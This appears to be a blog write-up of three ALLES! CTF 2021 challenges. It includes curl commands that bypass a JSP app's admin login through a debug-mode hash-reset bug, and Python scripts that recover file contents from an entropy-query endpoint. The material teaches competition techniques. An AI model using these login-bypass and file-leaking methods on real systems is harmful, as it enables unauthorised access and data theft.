---
title: "ALLES!CTF 2021"
date: 2021-09-06T14:46:10+08:00
draft: false
categories:
 - ctf
tags:
 - ctf
 - writeup
 - web
 - misc
summary: "Writeup for ALLES! CTF 2021"
---

# Background
04 Sept 2021, 00:00 HKT — 05 Sept 2021, 12:00 HKT  
Format: Jeopardy  
Official URL: https://ctf.alles.team/  
Event organizers: ALLES!  
CTFtime: https://ctftime.org/event/1313  
I joint [Black Bauhinia](https://b6a.black/) in this CTF and result in the 3rd place! Hard carried by the team and learnt a lot from them. I am going to share some of the challenges below that I was able to / almost solve.  


# Challenges
## Sanity Check - Web (104 points)
### Challenge :
> You aren't a 🤖, right?  


![robot](https://user-images.githubusercontent.com/19466939/132280404-b671310f-e287-4ae7-89a1-c0851eb17853.png)  

### Solution : 
A standard web challenge, 🤖 implies to check `robots.txt`.  
FLAG : **ALLES!{1_nice_san1ty_ch3k}**

## J(ust)-S(erving)-P(ages) - Web (144 points)
### Challenge :
> What could possibly go wrong with a website that is just serving pages? 🤔  


![home](https://user-images.githubusercontent.com/19466939/132283179-60f94868-cb9d-4167-9467-81f4668214de.png)

### Files :  
[deployment.zip](/files/ALLES/deployment.zip)

### Solution :  
A JSP web challenge which will display the flag at home page if you are admin, with the relevant code in `home.jsp` as shown below:

```
<% if(user.getIsAdmin()){ 
 ServletContext sc = request.getServletContext();

 out.println("Your flag is: "); 
 out.println(sc.getAttribute("FLAG"));
}
else {
 out.println("No flag for you :("); 
}%>
```
After some analysis on the logic (`main.js`), the app would store the password in `MD5(password)` during registration, and send the password in the format `SHA1(MD5(password))` during login: 
```
function pwd_handler_login(form)
{
        if (form.password.value != '')
        {
            form.password.value = CryptoJS.MD5(form.password.value).toString();
            form.password.value = CryptoJS.SHA1(form.password.value).toString();
            console.log(form.password.value);
        }
}

function pwd_handler_registration(form)
{
        if (form.password.value != '')
        {
            form.password.value = CryptoJS.MD5(form.password.value).toString();
            console.log(form.password.value);
        }
}
```
Also, the login handling logic is under `UserLoginServlet.java` which will call `userDao.checkLogin` instead. I deployed the app and tested locally and observed a weird thing after set the debug mode that I could not login even providing a "correct" password 🤔
![login](https://user-images.githubusercontent.com/19466939/132283438-60a2a9f0-e80b-442f-9956-06a9b9cf85a4.png)
Turns out from the `UserDAO.java`, we can notice the following vulnerable code: 
```
// User password in storage is only stored as md5, we should hash it again
MessageDigest digestStorage;
digestStorage = MessageDigest.getInstance("SHA-1");
digestStorage.update(u.getPassword().getBytes("ascii"));

byte[] passwordBytes = null;
try {
 passwordBytes = Hex.decodeHex(password_md5_sha1);
} catch (DecoderException e) {
 return null;
}

UserConfig userConfig = (UserConfig) request.getSession().getAttribute("config");

if (userConfig.isDebugMode()) {
 String pw1 = new String(Hex.encodeHex(digestStorage.digest()));
 String pw2 = password_md5_sha1;

 java.util.logging.Logger.getLogger("login")
   .info(String.format("Login tried with: %s == %s", pw1, pw2));
}

if (Arrays.equals(passwordBytes, digestStorage.digest())) {
 if (userConfig.isDebugMode())
  java.util.logging.Logger.getLogger("login").info("Passwords were equal");
 return u;
}
if (userConfig.isDebugMode())
 java.util.logging.Logger.getLogger("login").info("Passwords were NOT equal");
```
The server would check if the provided password (in SHA1 format already) is equal to SHA1 of stored password or not, which seems legitimate. However, if it's in the debug mode, The `digest` method was called before the real checking and from the documentation of the Class [MessageDiges](https://docs.oracle.com/javase/7/docs/api/java/security/MessageDigest.html), it stated that
> The digest method can be called once for a given number of updates. After digest has been called, the MessageDigest object is reset to its initialized state.  


Therefore the `passwordBytes` is comparing with SHA1 of empty string instead of the real password, thus we can provide the hash `da39a3ee5e6b4b0d3255bfef95601890afd80709` and login as admin to get the flag.

**Solve:**
1. Set Debug Mode:
`curl 'https://[challenge]/config' -H 'Cookie: JSESSIONID=[...]' -X POST --data '{"debugMode":true}'`  
![config](https://user-images.githubusercontent.com/19466939/132283104-5d074bde-e5cc-4f3a-a927-ac5536594ef3.png)

2. Login as admin:
`curl 'https://[challenge]/login' -H 'Cookie: JSESSIONID=[...]' -X POST --data 'username=admin&password=da39a3ee5e6b4b0d3255bfef95601890afd80709'`  
![admin](https://user-images.githubusercontent.com/19466939/132283147-6f4eb086-3b0f-4fb4-a5c2-717348ba3709.png)

FLAG : **ALLES!{ohh-b0y-java-y-u-do-th1s-t0-m3???!?}**

Thanks to Mystiz, ozetta and TWY for brainstorming together

## EntrAPI - Misc (415 points)
### Challenge :
> A very simple stegano tool that estimates the entropy of sections of a file by counting unique bytes in a range. Here's a snippet of the Dockerfile to get you started:  
> `COPY main.js index.html flag /`  
> `RUN deno cache main.js`  
> `EXPOSE 1024`  
> `CMD deno run -A main.js`  
> Happy guessing! :^)


![home](https://user-images.githubusercontent.com/19466939/132284620-d08757d3-9c52-4414-b783-c355426f8111.png)


### Solution : 
This is the most interesting challenge in this CTF in my opinion and we spent around 12 hours to solve this (and got the first blood).
From the description we knew the three key files filename and the app is run with `deno`. The webpage is simple, visualizing the entropy of the selected sections of the file:
![output](https://user-images.githubusercontent.com/19466939/132284646-164f2323-cae0-4c1e-8076-0d9933beb4bb.png)

By reading the source code of `index.html`, we can understand the `/query` function is similar to `len(set(f.open("path").read()[start:end]))` in Python.  
```
while (rangeEntropy) {
                const response = await fetch("/query", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ path, start, end })
                })
                rangeEntropy = (await response.json())["range-entropy"]
                start += BLOCK_SIZE
                end += BLOCK_SIZE
                console.log(`${start}-${end}: ${rangeEntropy} unique bytes`)
                document.getElementById("output").textContent += "\n" + "=".repeat(rangeEntropy)
            }
```
This challenge reminds me on some algorithm relating to finding substrings or something else. Also, as we know that the flag is in the format of `ALLES!{...}`, we do know the actually entropy from [0..7] of `/flag`.
My first thought is to identify the duplicated character by going throught different sections of the file and observing the change of the entropy. Below I will try to illustrate the idea step by step:  
1. First, `CL` and `CR` are 0 and `Entropy` is 1 obviously.  
![a](https://user-images.githubusercontent.com/19466939/132295104-23b4e565-81a6-4ddd-93c0-abcce09922df.png)
2. Next, `CR` is increased by 1 and `Entropy` is also increased by 1, meaning a new character is found.  
![b](https://user-images.githubusercontent.com/19466939/132295109-0323f323-4a4a-46fa-9499-6e1d5fc55165.png)
3. Next, `CR` is increased by 1 again but `Entropy` remain unchanged. This implies a duplicated character is found.  
![c](https://user-images.githubusercontent.com/19466939/132295112-bd997eeb-c9b5-40a6-a5eb-5850bfed49e5.png)
3.5 You can see the `Entropy` should be increased by 1 if there's no duplicated character.  
![d](https://user-images.githubusercontent.com/19466939/132295113-061e88e9-2121-42a9-9cd6-cf80cd917d9c.png)
4. We fix `CR` and increase `CL` by 1. The `Entropy` should decrease by 1.  
![e](https://user-images.githubusercontent.com/19466939/132295115-52b969c8-7ca2-450c-bcfb-5968f04b8b2b.png)
5. Next, `CL` is increased by 1 but `Entropy` remain unchanged. This implies we found the duplicate character position.  
![f](https://user-images.githubusercontent.com/19466939/132295118-24584e37-ef8d-49d3-9b6b-25fd1b1866d0.png)

The whole process is illustrated by the flowchart below, with my PoC to find the duplicated character position (🚨poor code warning🚨):
![flow](https://user-images.githubusercontent.com/19466939/132293423-1c6e6e58-64f6-45c3-853c-4b8b6e1ebdf5.png)

```
import requests, json

def req (cl, cr):
	try:
		requests.adapters.DEFAULT_RETRIES = 10
		headers = {'content-type': 'application/json', 'user-agent': 'slow connection'}
		datas = {"path":"/flag","start":cl, "end":cr}
		print("[ ] Trying to call path=/flag, start=" + str(cl) + ", end=" + str(cr))
		r = requests.post('https://[challenge]/query', data = json.dumps(datas), headers = headers, timeout = 15)
		return (json.loads(r.text)['range-entropy'])
	except Exception as e:
		print("[!] Failed. Retrying...", e)
		return req(cl, cr)

flag = [0 for i in range(109)] 
cl = 0
cr = 1
upper = 108
entropy = 0
entropy2 = 0
while cr <= upper:
	cl = 0
	tmp = req(cl, cr)
	print("[*] cl, cr, entropy", cl, cr, tmp)
	if (entropy + 1 != tmp):
		print("[*] Found duplicate")
		cl = cl + 1
		entropy2 = entropy
		while cl <= cr:
			tmp = req(cl, cr)
			print("[*] cl, cr, entropy", cl, cr, tmp)
			if (entropy2 - 1 != tmp):
				if (flag[cl - 1] in range(cl, cr)):
					entropy2 = entropy2 + 1
				else:
					flag[cl - 1] = (cr - 1)
					print("[*] Updating position...")
					print(flag)
					entropy = entropy - 1
					break
			cl = cl + 1
			entropy2 = entropy2 - 1
	cr = cr + 1
	entropy = entropy + 1
print(flag)
```
The result is `[92, 2, 0, 0, 93, 0, 0, 10, 33, 12, 20, 19, 23, 29, 22, 82, 30, 40, 77, 27, 24, 36, 35, 26, 50, 63, 34, 51, 67, 31, 65, 39, 0, 44, 37, 73, 45, 46, 0, 72, 61, 0, 47, 57, 59, 54, 48, 0, 52, 98, 68, 53, 56, 74, 55, 58, 62, 0, 64, 60, 80, 78, 66, 0, 76, 75, 71, 70, 0, 0, 0, 79, 81, 0, 85, 83, 0, 0, 0, 0, 86, 84, 0, 101, 0, 0, 0, 0, 102, 0, 91, 0, 0, 0, 100, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 0, 0]`, or in this way for the first few characters: `[0 1 1 2 3 4]` (recall the flag format is `ALLE!{...`.  
However we can see the first few characters that we knew are not showing up in the later part of the flag frequently. We failed to recover the flag directly...  
The next thing we tried is to leak the source code of `main.js`, with the result `[0, 1, 2, 3, 4, 5, 6, 7, 6, 8, 2, 2, 9, 0, 10, 11, 5, 12, 3, ...`. As we know it is a javascript file using deno, usually it should be in the format of `import library` or `import { method } from library`. From the result pattern we can conclude the first line is `import { ?pp?i??t?o...`. After checking some [examples](https://javascript-conference.com/blog/deno-the-end-of-node-js/) of deno, we can deduce the first line of code should be `import { Application, Router } from "https://deno.land/x/oak@v?.?.?/mod.ts";` with the unknown numeric version. With the updated PoC below, we were able to recover part of (only the char in the group `mp` below) the `main.js` and with some guessing manually, whole `main.js` "theoretically".

```
import requests
session = requests.Session()
SID = 'xxx'
cached = {}
def req(fn, start, end):
    ...<snip>...
length = 1660
fn = '/main.js'
group = [None for _ in range(length)]
gid = 0
# Init
i0 = -1
# Intermediate states
i0 = 62
group = [0, 1, 2, 3, 4, 5, 6, 7, 6, 8, 2, 2, 9, 0, 10, 11, 5, 0, 3, 12, 13, 6, 14, 3, 15, 5, 16, 4, 6, 17, 6, 18, 4, 3, 1, 6, 19, 20, 5, 5, 2, 21, 22, 23, 23, 24, 16, 12, 3, 25, 9, 11, 12, 24, 23, 26, 23, 3, 11, 27, 28, 29, None, None, None, None, ...<snip>..., None]
gid = 30
mp = {None: '?',0:  'i',1:  'm',2:  'p',3:  'o',4:  'r',5:  't',6:  ' ',7:  '{',8:  'A',9:  'l',10: 'c',11: 'a',12: 'n',13: ',',17: '}',18: 'f',19: '"',14: 'R',15: 'u',16: 'e',20: 'h',21: 's',22: ':',23: '/',24: 'd',25: '.',26: 'x',27: 'k',28: '@',29: 'v'}
last_occurance = {}
for i in range(i0):
    last_occurance[group[i]] = [i, group[i]]
for i in range(i0, length):
    if req(fn, 0, i) != req(fn, 0, i+1):
        # This is a new character!
        print("[*] Found new character")
        group[i] = gid
        gid += 1
    else:
        # Linear Search
        items = sorted(list(last_occurance.values()))
        l, r = 0, len(items)
        while l+1 < r:
            if req(fn, items[l][0], i+1) == req(fn, items[l][0]+1, i+1) + 1:
                l = l + 1
            else:
                # found duplicate char
                group[i] = items[l][1]
                break
    last_occurance[group[i]] = [i, group[i]]
    recov = ''.join([mp.get(g, ' ') for g in group])
    print('i0 =', i)
    print('group =', group)
    print('gid =', gid)
    print('-------')
    print(recov)
    print('-------')
    print()
```
_During the competition, Mystiz implemented another PoC with request.session and binary search in order to improve the efficiency of recovering the content. For the real solution, please wait for the writeup from Mystiz and I will update the link here later._  
In particular, there is a GET request for getting the flag ( btw we were very excited after retrieving the first line of this code segment but then received the message `go away`) and basically we tried to crack all combination of the possible hashes to obtain the pass `e7552d9b7c9a01fad1c37e452af4ac95    md5    gibflag`
```
router.get("/flag", async (ctx) => {
  const auth = ctx.request.headers.get('authorization') || '';
  const hasher = createHash("md5");
  hasher.update(auth);
  // NOTE: this is stupid and annoying. remove?
  // FIXME? crackstation.net knows this hash
  if (hasher.toString("hex") === "e(39)552d(63)b(39)c(63)a01fad1c3(39)e452af4ac(63)5") {
    ctx.response.body = await Deno.readTextFile("flag");
  } else {
    ctx.response.status = 403;
    ctx.response.body = 'go away';
  }
});
```
Thanks to Mystiz, harrier and cdemirer for brainstorming together during midnight :P

FLAG : **ALLES!{is_it_encryption_if_there's_no_key?also_a_bit_too_lossy_for_high_entropy_secrets:MRPPASQHX3b0QrMWH0WF}**

### Files :  
[EntrAPI.zip](/files/ALLES/EntrAPI.zip)
